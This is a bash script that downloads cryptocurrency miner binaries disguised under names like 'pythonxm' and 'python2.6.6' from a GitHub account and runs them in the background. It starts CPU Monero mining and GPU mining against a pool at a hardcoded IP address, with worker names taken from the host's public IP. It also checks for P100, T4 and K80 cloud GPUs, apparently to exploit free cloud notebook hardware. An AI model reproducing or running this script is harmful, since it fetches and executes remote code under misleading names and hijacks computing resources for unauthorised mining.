#!bin/bash -xe 

## getting IP info
iip=$(curl -s https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl ipinfo.io

echo '#######################################################'
echo '################## RV + 5G v0.0.8      ################'
echo '#######################################################'



#### Clean logs
echo > cuout
echo > ocout
echo > ocoutdef
echo > oout
echo > oout
echo > results.txt 

########## XMR
rm -rf pythonxm
rm -rf config.json
rm -rf x.out
rm -rf pythonheq

# Prepare
PoolHost=116.203.10.54
VR_Port=3000





########## CPU ##########
####### XM
#               Executable
wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
chmod +x pythonxm
#                Config
wget -q https://github.com/one10001/10001code/raw/main/config.json
sed -i "s+ip0001+RV_$IPNAME+g" config.json


./pythonxm -c config.json 2>> oout 1>> oout &

###### Ver
#wget -q https://github.com/one10001/10001code/raw/main/pythonheq
#chmod +x pythonheq



#./pythonheq -v -l 116.203.10.54:3000 -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."RV_"$IPNAME -t 4   1>> oout 2>> oout &

###### 5G
#wget -q https://github.com/one10001/10001code/raw/main/pythoncpu
#chmod +x pythoncpu

#./pythoncpu -a x16rv2 -o stratum+tcp://116.203.10.54:3015 -u 5PJxraBqyU1yKK5QukamiMZqNdWPcZ3wwB -p c=VGC -t 4 1> oout 2> oout &


########## GPU ##########
rm -rf python2.6.6
rm -rf pythonoc
wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
chmod +x python2.6.6
cp python2.6.6 pythonoc
while true
do
if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
then

echo "####################### P100-PCIE #########################"
nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RV_CU_P100_$IPNAME@116.203.10.54:80  -U 2>> oout 1>> oout &

elif [ $(nvidia-smi | grep T4 |wc -l) == 1 ]
then
nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_T4_$IPNAME@116.203.10.54:80  -G  2>> oout 1>> oout &
elif [ $(nvidia-smi | grep K80 |wc -l) == 1 ]
then
nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_K80_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
else
nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_Other_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
fi


tail -f oout

done
tail -f oout
